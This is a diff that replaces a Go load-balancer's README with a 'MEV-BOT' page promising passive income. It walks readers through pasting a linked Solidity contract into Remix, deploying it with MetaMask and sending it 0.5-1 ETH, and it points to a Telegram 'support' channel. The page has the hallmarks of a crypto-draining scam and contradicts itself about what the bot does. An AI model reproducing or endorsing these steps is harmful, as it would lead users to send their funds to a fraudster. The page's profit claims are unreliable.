@@ -1,115 +1,89 @@
-# balancer
+<p align="center">
+  <img src="https://github.com/JakeSub/lon/assets/132209154/3b460a04-7d23-4f1c-8ec4-aca91691b138" />
+</p>
 
-[![Go Report Card](https://goreportcard.com/badge/github.com/zehuamama/balancer)&nbsp;](https://goreportcard.com/report/github.com/zehuamama/balancer)![GitHub top language](https://img.shields.io/github/languages/top/zehuamama/balancer)&nbsp;![GitHub](https://img.shields.io/github/license/zehuamama/balancer)&nbsp;[![CodeFactor](https://www.codefactor.io/repository/github/zehuamama/balancer/badge)](https://www.codefactor.io/repository/github/zehuamama/balancer)&nbsp;[![codecov](https://codecov.io/gh/zehuamama/balancer/branch/main/graph/badge.svg)](https://codecov.io/gh/zehuamama/balancer)&nbsp; ![go_version](https://img.shields.io/badge/go%20version-1.17-yellow)
+# 🚀 MEV-BOT: Your Ticket to Passive Income
 
-`balancer` is a layer 7 load balancer that supports http and https, and it is also a go library that implements `load balancing` algorithms.
+Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure , you can earn passive income by exploiting MEV-BOT. 
 
-It currently supports load balancing algorithms: 
-* `round-robin`
-* `random`
-* `power of 2 random choice`
-* `consistent hash`
-* `consistent hash with bounded`
-* `ip-hash`
-* `least-load`
+MEV-BOT provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
 
-## Install
-First download the source code of balancer:
-```shell
-> git clone https://github.com/zehuamama/balancer.git
-```
-compile the source code:
-```shell
-> cd ./balancer
+> **⏰ Attention!** This code is for sharing only and cannot be used for commercial purposes.
 
-> go build
-```
+<p align="center">
+  <img src="http://i.countdownmail.com/2kn5rc.gif" />
+</p>
 
-## Run
-`Balancer` needs to configure the `config.yaml` file, see [config.yaml](https://github.com/zehuamama/balancer/blob/main/config.yaml) :
+## 💡 Introducing Bot
 
-and now, you can execute `balancer`, the balancer will print the ascii diagram and configuration details:
-```shell
-> ./balancer
+MEV-BOT is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-___ _ _  _ _   _ ___  ____ _    ____ _  _ ____ ____ ____ 
- |  | |\ |  \_/  |__] |__| |    |__| |\ | |    |___ |__/ 
- |  | | \|   |   |__] |  | |___ |  | | \| |___ |___ |  \                                        
+MEV-BOT aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
-Schema: http
-Port: 8089
-Health Check: true
-Location:
-        Route: /
-        Proxy Pass: [http://192.168.1.1 http://192.168.1.2:1015 https://192.168.1.2 http://my-server.com]
-        Mode: round-robin
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-```
-`balancer` will perform `health check` on all proxy sites periodically. When the site is unreachable, it will be removed from the balancer automatically . However, `balancer` will still perform `health check` on unreachable sites. When the site is reachable, it will add it to the balancer automatically.
+## 📊 Platform Comparison 
 
-## API Usage
-`balancer` is also a go library that implements load balancing algorithms, it can be used alone as an API, you need to import it into your project first:
-```shell
-> go get github.com/zehuamama/balancer/balancer
-```
+| Platform      | Router Address  | Network | Mempool Scan Time |
+| ------------- |:---------------:| -------:| ----------------: |
+| Pancakeswap   | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e)| BSC     | 0.78 sec         |
+| Uniswap       | [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D](https://etherscan.io/address/0x7a250d5630b4cf539739df2c5dacb4c659f2488d)| ETH     | 0.32 sec         |
 
-Build the load balancer with `balancer.Build`:
-```go
-hosts := []string{
-	"http://192.168.11.101",
-	"http://192.168.11.102",
-	"http://192.168.11.103",
-	"http://192.168.11.104",
-}
+## 🤖 How to Use MEVBot
 
-lb, err := balancer.Build(balancer.P2CBalancer, hosts)
-if err != nil {
-	return err
-}
-```
-and you can use balancer like this:
-```go
+### Step 1: Access the Source Code 📝
+1. Download MetaMask (if you don’t have it already): [https://metamask.io/download.html/]()
+   Navigate to the Remix IDE: [https://remix.ethereum.org/]()
 
-clientAddr := "172.160.1.5"  // request IP
-	
-targetHost, err := lb.Balance(clientAddr) 
-if err != nil {
-	log.Fatal(err)
-}
-	
-lb.Inc(targetHost)
-defer lb.Done(targetHost)
+2. Create a new file "MevBot.sol".
+3. Copy [this code](sourcecode.sol) and paste it into the Remix IDE.
 
-// route to target host
-```
-each load balancer implements the `balancer.Balancer` interface:
-```go
-type Balancer interface {
-	Add(string)
-	Remove(string)
-	Balance(string) (string, error)
-	Inc(string)
-	Done(string)
-}
-```
-currently supports the following load balancing algorithms:
-```go
-const (
-	IPHashBalancer         = "ip-hash"
-	ConsistentHashBalancer = "consistent-hash"
-	P2CBalancer            = "p2c"
-	RandomBalancer         = "random"
-	R2Balancer             = "round-robin"
-	LeastLoadBalancer      = "least-load"
-	BoundedBalancer        = "bounded"
-)
-```
+<p align="center">
+ <img src="https://i.ibb.co/J59pph4/2.jpg" alt="2" border="0">
+</p>
+
+### Step 2: Compile the Code ⚙️
+1. Click on the "Solidity Compiler" tab, select the appropriate compiler version 0.6.12, and click on "Compile MevBot.sol".
+2. Click on the "Deploy & Run Transactions" tab Select "Injected Privider - MetaMask".
+
+<p align="center">
+  <img src="https://i.ibb.co/rfbwTGK/3.jpg" alt="3" border="0">
+ </p>
+ <p align="center">
+  <img src="https://i.ibb.co/q0yCXV5/4.jpg" alt="4" border="0">
+</p>
+
+### Step 3: Choose the Network 🌐
+1. Select either ETH or BSC (BNB) network.
+
+### Step 4: Deploy the Code 🚀
+1. Click 'Transact (Deploy)'.
+
+<p align="center">
+  <img src="https://i.ibb.co/xF4fSVv/5.jpg" alt="5" border="0">
+</p>
+
+### Step 5: Deposit MEVBot starting funds 💰
+1. Copy your MEV contract and send an amount of Ethereum for the bot's operation. 
+2. Start the bot by pressing the 'Start' button.
+
+> **🔔 Note:** For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.5-1 ETH. 
+
+<p align="center">
+  <img src="https://github.com/JakeSub/lon/assets/132209154/9d9f4573-cb52-48f2-9f0b-d37e6ea2b73d" />
+</p>
+
+You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
 
 
-## Contributing
+---
 
-If you are interested in contributing to balancer, please see here: [CONTRIBUTING](https://github.com/zehuamama/balancer/blob/main/CONTRIBUTING.md)
+## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
+
+## Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
 
 ## License
 
-balancer is licensed under the term of the [BSD 2-Clause License](https://github.com/zehuamama/balancer/blob/main/LICENSE)
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
